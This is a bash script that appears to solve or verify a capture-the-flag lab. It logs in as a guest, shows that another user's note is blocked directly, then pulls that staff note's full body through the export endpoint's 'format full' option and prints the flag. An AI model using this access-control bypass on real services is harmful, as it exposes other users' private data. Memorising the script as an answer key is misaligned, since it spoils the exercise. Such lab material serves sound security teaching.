#!/bin/bash
set -euo pipefail
work=$(mktemp -d /tmp/export-gap.XXXXXX)
trap 'rm -rf "$work"' EXIT
base=http://app:8000
request() {
    curl --silent --show-error --max-time 5 -o "$work/reply.json" -w '%{http_code}' "$@"
}
test "$(request "$base/api/notes/7")" = 401
test "$(request -H 'Content-Type: application/json' -d '{"note_id":42}' "$base/api/exports")" = 401
test "$(request -c "$work/cookies" -H 'Content-Type: application/json' -d '{"username":"guest","password":"lab-guest"}' "$base/api/login")" = 200
test "$(request -b "$work/cookies" "$base/api/notes/7")" = 200
jq -e '.owner == "guest" and .body == "Meeting is on Friday."' "$work/reply.json" >/dev/null
test "$(request -b "$work/cookies" -H 'Content-Type: application/json' -d '{"note_id":7}' "$base/api/exports")" = 200
jq -e '.redacted == true and (.export | has("body") | not)' "$work/reply.json" >/dev/null
test "$(request -b "$work/cookies" -H 'Content-Type: application/json' -d '{"note_id":7,"format":"full"}' "$base/api/exports")" = 200
jq -e '.export.body == "Meeting is on Friday."' "$work/reply.json" >/dev/null
test "$(request -b "$work/cookies" "$base/api/notes/42")" = 403
test "$(request -b "$work/cookies" -H 'Content-Type: application/json' -d '{"note_id":42}' "$base/api/exports")" = 200
jq -e '.redacted == true and (.export | has("body") | not)' "$work/reply.json" >/dev/null
status=$(request -b "$work/cookies" -H 'Content-Type: application/json' -d '{"note_id":42,"format":"full"}' "$base/api/exports")
if [ "$status" = 403 ]; then exit 3; fi
test "$status" = 200
jq -er '.export | select(.id == 42 and .owner == "staff") | .body | select(startswith("pwnden{"))' "$work/reply.json"
